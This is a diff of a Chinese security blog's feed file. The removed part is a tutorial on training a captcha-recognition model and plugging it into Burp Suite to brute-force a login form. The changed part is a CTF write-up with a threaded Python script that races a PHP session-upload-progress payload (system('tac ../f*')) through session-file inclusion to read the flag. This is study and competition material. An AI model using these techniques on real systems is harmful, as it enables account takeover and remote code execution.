-<h3 id="项目使用"><a class="header-anchor" href="#项目使用">¶</a>项目使用</h3>
-<p>确认安装好python的第三方库之后，就可以开始模型的训练了~<br>
-一开始，在没有图片验证码的数据集的情况下，我们可以借助gen_sample_by_captcha.py文件生成验证码的数据集</p>
-<p>首先，我们需要去配置文件进行一个修改（当然不修改也可以）打开conf/captcha_config.json文件，修改成像我这样<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/_4_CH%7BQQ4867P%25%7D80DQ2%28TE.png" alt=""><br>
-一开始我们就先训练纯数字的验证码模型，设置的过于复杂，模型的训练时间也会越长，想要有良好的识别率，就不得不进行多次训练。<br>
-运行gen_sample_by_captcha.py文件，生成10000张图片文件<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/R2%29%24R8A08%40%608%40%5B%25ZQL3N%25%25K.png" alt=""><br>
-在sample/origin目录下可以看见生成的图片<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/H%40PA%40K7FZO3%5D%40%25R%60Q1BIX3D.png" alt=""><br>
-然后sample/origin目录下新建两个文件夹，train和test（不用创建也行，代码里会自动判断有无，进行创建）<br>
-接下来需要使用verify_and_split_data.py文件，我们先看一下他的配置文件/conf/sample_config.json</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;origin_image_dir&quot;: &quot;sample&#x2F;origin&#x2F;&quot;,  # 原始文件</span><br><span class="line">  &quot;new_image_dir&quot;: &quot;sample&#x2F;new_train&#x2F;&quot;,  # 新的训练样本</span><br><span class="line">  &quot;train_image_dir&quot;: &quot;sample&#x2F;train&#x2F;&quot;,    # 训练集</span><br><span class="line">  &quot;test_image_dir&quot;: &quot;sample&#x2F;test&#x2F;&quot;,      # 测试集</span><br><span class="line">  &quot;api_image_dir&quot;: &quot;sample&#x2F;api&#x2F;&quot;,        # api接收的图片储存路径</span><br><span class="line">  &quot;online_image_dir&quot;: &quot;sample&#x2F;online&#x2F;&quot;,  # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;local_image_dir&quot;: &quot;sample&#x2F;local&#x2F;&quot;,    # 本地保存图片的路径</span><br><span class="line">  &quot;model_save_dir&quot;: &quot;model&#x2F;&quot;,            # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;image_width&quot;: 100,                    # 图片宽度</span><br><span class="line">  &quot;image_height&quot;: 60,                    # 图片高度</span><br><span class="line">  &quot;max_captcha&quot;: 4,                      # 验证码字符个数</span><br><span class="line">  &quot;image_suffix&quot;: &quot;png&quot;,                 # 图片文件后缀</span><br><span class="line">  &quot;char_set&quot;: &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;,  # 验证码识别结果类别</span><br><span class="line">  &quot;use_labels_json_file&quot;: false,                       # 是否开启读取&#96;labels.json&#96;内容</span><br><span class="line">  &quot;remote_url&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:6100&#x2F;captcha&#x2F;&quot;,      # 验证码远程获取地址</span><br><span class="line">  &quot;cycle_stop&quot;: 3000,                                  # 启动任务后的训练指定次数后停止</span><br><span class="line">  &quot;acc_stop&quot;: 0.99,                                    # 训练到指定准确率后停止</span><br><span class="line">  &quot;cycle_save&quot;: 500,                                   # 训练指定次数后定时保存模型</span><br><span class="line">  &quot;enable_gpu&quot;: 0,                                     # 是否开启GUP训练</span><br><span class="line">  &quot;train_batch_size&quot;: 128,                             # 训练时每次使用的图片张数，如果CPU或者GPU内存太小可以减少这个参数</span><br><span class="line">  &quot;test_batch_size&quot;: 100                               # 每批次测试时验证的图片张数，不要超过验证码集的总数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们进行一个简单修改，打码部分是我自定义的地址，暂时可以保持原路径不变<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/HXWUB_WGG2%7DFJPI37AZCS%5BA.png" alt=""><br>
-然后运行verify_and_split_data.py文件，程序会同时校验和分割origin和new_train两个目录中的图片,按照比例分到test和train文件夹中；<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/~R77DWZRZXH4GH%252W%5BATK9O.png" alt=""><br>
-后续有了更多的样本，可以把样本放在new_train目录中再次执行verify_and_split_data。<br>
-程序会把无效的文件留在原文件夹。<br>
-此外，当你有新的样本需要一起训练，可以放在sample/new目录下，再次运行verify_and_split_data.py即可。<br>
-需要注意的是，如果新的样本中有新增的标签，你需要把新的标签增加到char_set配置中或者labels.json文件中</p>
-<p>训练集和测试集都有了之后，接下来就是训练模型，运行train_model.py文件进行模型训练<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%409HLQA8%28J%7D%7B_1E1%7DVJEI%60%7BR.png" alt=""><br>
-训练模型的速度取决取决于你的电脑，可能几十分钟，可能几个小时或者几十个小时不等，可以重复多次运行文件进行训练提高准确率<br>
-这里贴张下面讲实战中使用的模型的训练图片，使用了2000张验证码图片，我的电脑跑了一分钟左右的时间吧<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%28LUUW%28M9X%7DFU9G%7DGJL5TQPR.png" alt=""><br>
-接下来我们运行test_batch.py文件进行一个验证<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5D4KSDH%60KUWFJO%7DKUY61P~ZY.png" alt=""><br>
-接着启动接口的api，运行webserver_recognize_api.py，此时占一个会话窗口<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WHR9A%25W0%5BL878MEGG~%7DB%40%605.png" alt=""><br>
-再次运行，默认是6000端口，这里我改成了7000端口<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/GE~ZGQURWU%282PL%7D%7BE7H1%28W0.png" alt=""><br>
-启动recognize_local.py文件发送请求进行一个验证<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/Z7%7B_4%29F8%60F%5D4%60DUT%7DP4TV_I.png" alt=""><br>
-接口返回数据就ok啦~</p>
-<h2 id="captcha-killer的安装"><a class="header-anchor" href="#captcha-killer的安装">¶</a>captcha-killer的安装</h2>
-<p>项目地址:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;captcha-killer&#x2F;releases</span><br></pre></td></tr></table></figure>
-<p>下载好jar包之后，打开burpsuite进行安装<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/BGR%24~525EAJZ%7D%257%60QJ%7BBFLP.png" alt=""></p>
-<h1>实战</h1>
-<p>首先使用python爬虫对网站的验证码进行一个爬取<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/1IOO51MC64~YFHOLE%7D_%5B%24LN.png" alt=""><br>
-然后按照上面的步骤进行一个模型训练<br>
-这是我本人服务器上搭建的网站<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
-首先，我们需要抓取生成验证码文件的包，然后右键发送到captcha面板上<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154445.png" alt=""><br>
-然后在killer面板上，点击一下获取，就可以出现验证码图片和信息了<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/2~EOM%5B%25%5BN%7BFNI%40L%28ZM~2DZU.png" alt=""><br>
-然后我们需要在webserver_recognize_api.py文件新增加一个方法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/base64&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_imageBase64</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;image_file&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">        timec = str(time.time()).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        file = request.form[<span class="string">&#x27;image_file&#x27;</span>]</span><br><span class="line">        img = base64.b64decode(file)</span><br><span class="line">        img = BytesIO(img)</span><br><span class="line">        img = Image.open(img, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="comment"># username = request.form.get(&quot;name&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸: &#123;&#125;&quot;</span>.format(img.size))</span><br><span class="line">        img_size = img.resize((image_width, image_height), Image.ANTIALIAS)</span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸2：&#123;&#125;&quot;</span>.format(img_size))</span><br><span class="line">        s = time.time()</span><br><span class="line">        value = R.rec_image(img_size)</span><br><span class="line">        e = time.time()</span><br><span class="line">        print(<span class="string">&quot;识别结果: &#123;&#125;&quot;</span>.format(value))</span><br><span class="line">        <span class="comment"># 保存图片</span></span><br><span class="line">        print(<span class="string">&quot;保存图片： &#123;&#125;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(api_image_dir, value, timec, image_suffix))</span><br><span class="line">        file_name = <span class="string">&quot;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(value, timec, image_suffix)</span><br><span class="line">        file_path = os.path.join(api_image_dir + file_name)</span><br><span class="line">        img.save(file_path)</span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: timec,   <span class="comment"># 时间戳</span></span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: value,  <span class="comment"># 预测的结果</span></span><br><span class="line">            <span class="string">&#x27;speed_time(ms)&#x27;</span>: int((e - s) * <span class="number">1000</span>)  <span class="comment"># 识别耗费的时间</span></span><br><span class="line">        &#125;</span><br><span class="line">        img.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = json.dumps(&#123;<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;1001&quot;</span>&#125;)</span><br><span class="line">        resp = response_headers(content)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
-<p>因为原本的方法up_image()是发送本地图片文件的形式，而我们在captcha_killer需要通过发送表单请求来进行接收<br>
-接着再发送一个requests请求，进行抓包后发送到interface面板上<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154703.png" alt=""><br>
-然后我们把图片内容的位置用标签来代替。<br>
-比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么Requst template(请求模版)面板应该填写如下：<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WI%40%604SZ%29%5D4CUK%256MCFK042G.png" alt=""><br>
-接口模板设置：</p>
-<table>
-<thead>
-<tr>
-<th>ID</th>
-<th>标签</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</td>
-<td>代表验证码图片原二进制内容</td>
-</tr>
-<tr>
-<td>2</td>
-<td>&lt;@URLENCODE&gt;<a href="mailto:/@URLENCODE">/@URLENCODE</a></td>
-<td>对标签内的内容进行url编码</td>
-</tr>
-<tr>
-<td>3</td>
-<td>&lt;@BASE64&gt;<a href="mailto:/@BASE64">/@BASE64</a></td>
-<td>对标签内的内容进行base64编码</td>
-</tr>
-</tbody>
-</table>
-<p>然后点击识别，即可获取到接口返回的数据包<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/E%7BZN79%25Z56%7B5W5%7D%7B%28CQAG~I.png" alt=""><br>
-这里的匹配方式规则：</p>
-<table>
-<thead>
-<tr>
-<th>ID</th>
-<th>规则类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>Repose  data</td>
-<td>这种规则用于匹配接口返回包内容直接是识别结果</td>
-</tr>
-<tr>
-<td>2</td>
-<td>Regular  expression</td>
-<td>正则表达式,适合比较复杂的匹配。比如接口返回包{“coede”:1,“result”:“abcd”}说明abcd是识别结果，我们可以编写规则为result&quot;:“(.*?)”}</td>
-</tr>
-<tr>
-<td>3</td>
-<td>Define  the start and end positions</td>
-<td>定义开始和结束位置,使用上面的例子，可以编写规则{“start”:21,“end”:25}</td>
-</tr>
-<tr>
-<td>4</td>
-<td>Defines  the start and end strings</td>
-<td>定义开始和结束字符，使用上面的例子，可以编写规则为{“start”:“result”:“,“end”:”“}”}</td>
-</tr>
-</tbody>
-</table>
-<p>确认识别无误之后，点击锁定，避免一会进行爆破时出错</p>
-<p>接下来我们去抓取登录界面发送的包，然后发送到intruder面板，然后设置参数<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/AHZMTVCB%60RAA%28X4X3MKI%28GI.png" alt=""><br>
-验证码的pyload选择我们的插件进行生成<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/VI%256A%7BKPX3DTJSZU5T%25Y0P3.png" alt=""><br>
-成功拿到密码<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5BS2N%29%5BR%7BF%7D4OJHTGJ0QDB%7B3.png" alt=""></p>
-<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
-]]></content>
-      <tags>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3355,9 +3355,10 @@ web82写的脚本改改直接用</p>
 <p>这次把<code>.</code>给ban了，我们使用session文件包含，又忘记知识点的可以去看web82；还是一样先上传<code>.user.ini	</code>，内容为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_muma</span><br></pre></td></tr></table></figure>
 <p>接着再运行脚本即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/8 17:06</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://4e81dbfa-6ee5-471e-b8cd-d1d2553f58ea.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;GIF89a\naaaaaa&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.png&#x27;</span>, f, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">        response = session.post(url+<span class="string">&quot;upload.php&quot;</span>,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;muma&#x27;</span>&#125;, data=data, files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/8 17:06</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;GIF89a\ndotast&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.png&#x27;</span>, f, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">        response = session.post(url+<span class="string">&quot;upload.php&quot;</span>,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;muma&#x27;</span>&#125;, data=data, files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
 <p>运行完后得到flag</p>
 <h3 id="web163"><a class="header-anchor" href="#web163">¶</a>web163</h3>
+<p>和上题一样采用session文件包含</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
